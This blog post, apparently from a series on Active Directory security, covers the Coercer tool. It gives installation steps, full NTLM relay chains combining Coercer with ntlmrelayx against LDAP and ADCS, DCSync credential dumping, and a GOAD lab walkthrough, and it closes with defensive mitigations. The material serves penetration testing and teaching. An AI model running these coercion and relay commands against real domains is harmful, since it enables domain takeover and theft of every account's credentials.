---
layout: post
title: "10 Days of AD Security: Day 10 - Coercer"
date: 2026-02-14
category: Active Directory Security
author: James Wells
---

## History and Overview

Coercer is an automated authentication coercion tool created by Podalirius (@podalirius_) and released in 2022. The tool emerged from research into Windows protocols that can be abused to force remote systems to authenticate back to an attacker-controlled server, enabling NTLM relay attacks. While tools like PetitPotam (MS-EFSRPC abuse) and PrinterBug (MS-RPRN abuse) demonstrated individual coercion techniques, Coercer unified these attacks into a single framework supporting over 20 different Windows RPC protocols. The tool works by calling specific RPC functions on target systems that trigger outbound authentication attempts, which can then be relayed to other systems for privilege escalation or authentication. Coercer automates the discovery of which protocols are available on target systems and which specific RPC calls are most likely to succeed, significantly reducing the manual effort required for coercion attacks. With 2.2k GitHub stars and moderate activity through October 2023, Coercer represents the systematization of coercion attacks, making them accessible to penetration testers who may not understand the low-level RPC protocol details. The tool supports both SMB and HTTP authentication coercion, targeting different relay opportunities depending on the environment configuration.

## Download and Installation

**Official Source:** [https://github.com/p0dalirius/Coercer](https://github.com/p0dalirius/Coercer)

**Installation:**

```bash
# Install via pip
pip3 install coercer

# Or install from source
git clone https://github.com/p0dalirius/Coercer.git
cd Coercer
pip3 install -r requirements.txt
python3 setup.py install

# Verify installation
coercer --help
```

**Dependencies:**
- Python 3.6+
- Impacket library
- Various RPC libraries (installed automatically)

## When to Use Coercer

Use Coercer when you need to:
- **Force authentication for relay**: Make target systems authenticate to attacker server
- **NTLM relay attacks**: Combine with ntlmrelayx to relay authentication
- **Privilege escalation**: Relay machine account authentication to LDAP/ADCS
- **Test coercion vulnerabilities**: Audit which protocols are exploitable
- **Bypass protections**: Try multiple coercion techniques when some are patched
- **Automated discovery**: Scan network for coercion-vulnerable systems
- **WebDAV coercion**: Force HTTP authentication for relay to ADCS
- **Machine account exploitation**: Obtain TGT for computer accounts via coercion+relay

Coercer is typically used mid-engagement when you have low-privilege credentials and need to escalate privileges through relay attacks. It's often combined with impacket-ntlmrelayx for complete attack chains.

## Walkthrough

**Basic Coercion Attack:**

```bash
# Coerce target to authenticate to attacker
coercer -u user -p password -d domain.local -t 192.168.1.50 -l 192.168.1.100

# Parameters:
# -u: Username
# -p: Password
# -d: Domain
# -t: Target to coerce
# -l: Listener IP (where to coerce authentication)
```

**Scan for Available Coercion Methods:**

```bash
# Scan target for all available RPC methods
coercer scan -u user -p password -d domain.local -t 192.168.1.50

# This identifies which protocols are accessible:
# - MS-RPRN (PrinterBug)
# - MS-EFSRPC (PetitPotam)
# - MS-DFSNM
# - MS-FSRVP
# - etc.
```

**Specific Protocol Exploitation:**

```bash
# Use specific coercion method
coercer -u user -p password -d domain.local -t 192.168.1.50 -l 192.168.1.100 --filter-protocol-name MS-RPRN

# Multiple protocols
coercer -u user -p password -d domain.local -t 192.168.1.50 -l 192.168.1.100 --filter-protocol-name MS-RPRN,MS-EFSRPC

# List all available methods
coercer --list-methods
```

**Authentication Types:**

```bash
# SMB coercion (default - triggers SMB authentication)
coercer -u user -p password -d domain.local -t 192.168.1.50 -l 192.168.1.100

# HTTP/WebDAV coercion (for ADCS relay)
coercer -u user -p password -d domain.local -t 192.168.1.50 -l 192.168.1.100 --webdav-host attacker.com --webdav-port 80

# Force authentication to HTTP for ADCS
coercer -u user -p password -d domain.local -t 192.168.1.50 -l 192.168.1.100 --always-continue --http
```

**Complete Relay Attack Chain:**

```bash
# Terminal 1: Set up ntlmrelayx (relay to LDAP for privilege escalation)
impacket-ntlmrelayx -t ldap://dc.domain.local --escalate-user lowpriv

# Terminal 2: Coerce DC to authenticate
coercer -u lowpriv -p password -d domain.local -t dc.domain.local -l attacker-ip

# Result: lowpriv user gets DCSync rights through relay
```

**ADCS Relay Attack:**

```bash
# Terminal 1: Relay to ADCS HTTP endpoint
impacket-ntlmrelayx -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Terminal 2: Coerce DC to authenticate via HTTP
coercer -u user -p pass -d domain.local -t dc.domain.local -l attacker-ip --webdav-host attacker.com

# Result: Obtain DC certificate for complete domain compromise
```

**Bulk Coercion:**

```bash
# Coerce multiple targets from file
coercer -u user -p pass -d domain.local -tf targets.txt -l attacker-ip

# targets.txt contains IPs/hostnames of systems to coerce
```

## Game of Active Directory Lab Example

In the GOAD environment, Coercer enables privilege escalation through relay attacks:

**Scenario: From Low-Privilege User to Domain Admin via LDAP Relay**

1. **Initial Access**:
   ```bash
   # We have credentials for samwell.tarly (low-privilege user)
   # Goal: Escalate to Domain Admin via relay attack
   ```

2. **Check for SMB Signing** (prerequisite for relay):
   ```bash
   # Identify targets without SMB signing
   nxc smb 192.168.56.0/24 --gen-relay-list relay-targets.txt

   # Verify DC is reachable for LDAP relay
   ```

3. **Set Up ntlmrelayx**:
   ```bash
   # Terminal 1: Relay to LDAP to grant DCSync rights
   impacket-ntlmrelayx -t ldap://192.168.56.11 --escalate-user samwell.tarly

   # This waits for authentication to relay
   ```

4. **Coerce Authentication**:
   ```bash
   # Terminal 2: Force Winterfell DC to authenticate
   coercer -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local -t winterfell.north.sevenkingdoms.local -l 192.168.56.100

   # Coercer tries multiple protocols:
   # - MS-RPRN (PrinterBug)
   # - MS-EFSRPC (PetitPotam) - may be patched
   # - MS-DFSNM
   # - Others until one succeeds
   ```

5. **Successful Relay**:
   ```bash
   # Terminal 1 shows:
   # [*] Authenticating against ldap://192.168.56.11 as NORTH/WINTERFELL$ SUCCEED
   # [*] Escalating user samwell.tarly
   # [*] samwell.tarly now has DCSync rights!
   ```

6. **DCSync Attack**:
   ```bash
   # Use newly granted DCSync rights
   impacket-secretsdump north.sevenkingdoms.local/samwell.tarly:Heartsbane@192.168.56.11 -just-dc

   # Extract all domain credentials including:
   # - Administrator
   # - krbtgt
   # - All user hashes
   ```

7. **ADCS Relay Attack in GOAD**:
   ```bash
   # GOAD has ADCS, target it instead
   # Terminal 1: Relay to Certificate Services
   impacket-ntlmrelayx -t http://192.168.56.23/certsrv/certfnsh.asp --adcs --template DomainController

   # Terminal 2: Coerce with HTTP
   coercer -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local -t winterfell.north.sevenkingdoms.local -l 192.168.56.100 --webdav-host 192.168.56.100 --always-continue

   # Obtain DC certificate → authenticate as DC → Domain Admin
   ```

**GOAD-Specific Coercer Applications:**
- Test all coercion protocols against GOAD infrastructure
- Demonstrate relay attacks against GOAD's LDAP/ADCS
- Practice chaining Coercer → ntlmrelayx → privilege escalation
- Identify which GOAD systems are vulnerable to specific protocols
- Cross-domain coercion attacks leveraging GOAD trust relationships

## Conclusion

Coercer represents the automation and systematization of Windows authentication coercion attacks. By unifying 20+ different RPC-based coercion techniques into a single tool, Coercer makes complex relay attacks accessible to penetration testers without requiring deep protocol expertise. The tool's ability to automatically discover and try multiple coercion methods significantly improves success rates in diverse environments.

In the GOAD lab, Coercer demonstrates the critical importance of defensive measures like SMB signing, LDAP signing/channel binding, and Extended Protection for Authentication (EPA) on ADCS. The tool shows how a low-privilege user can escalate to Domain Admin purely through protocol abuse and relay attacks, without exploiting any software vulnerabilities.

For defenders, mitigating coercion attacks requires a multi-layered approach: enabling SMB signing on all systems (especially DCs and high-value servers), configuring LDAP signing and channel binding, implementing EPA on ADCS, and monitoring for unusual RPC calls to sensitive protocols. Microsoft has patched some coercion techniques (like unauthenticated PetitPotam), but authenticated variants remain viable, and new coercion methods continue to be discovered.

Understanding Coercer is essential for both red teams looking to escalate privileges and blue teams seeking to defend against relay-based attacks. The tool exemplifies how protocol features intended for legitimate administration can be abused for unauthorized privilege escalation.

---

**Series Conclusion:**

This completes the 10 Days of AD Security series covering the most effective and essential tools for offensive Active Directory operations in 2026. From reconnaissance with BloodHound to privilege escalation with Certipy and Coercer, these tools represent the core offensive toolkit for modern AD penetration testing.

Each tool fills a specific role in the attack lifecycle:
- **BloodHound**: Attack path discovery
- **Impacket**: Protocol-level interaction foundation
- **Rubeus**: Kerberos exploitation
- **Mimikatz**: Credential extraction
- **NetExec**: Large-scale automation and lateral movement
- **Certipy**: ADCS exploitation
- **Sliver**: Command and control infrastructure
- **Responder**: Initial credential capture
- **Evil-WinRM**: Remote access and post-exploitation
- **Coercer**: Authentication coercion for relay attacks

Together, these tools enable comprehensive AD security assessments and demonstrate the critical importance of defense-in-depth strategies, proper configuration management, and continuous monitoring in Active Directory environments.
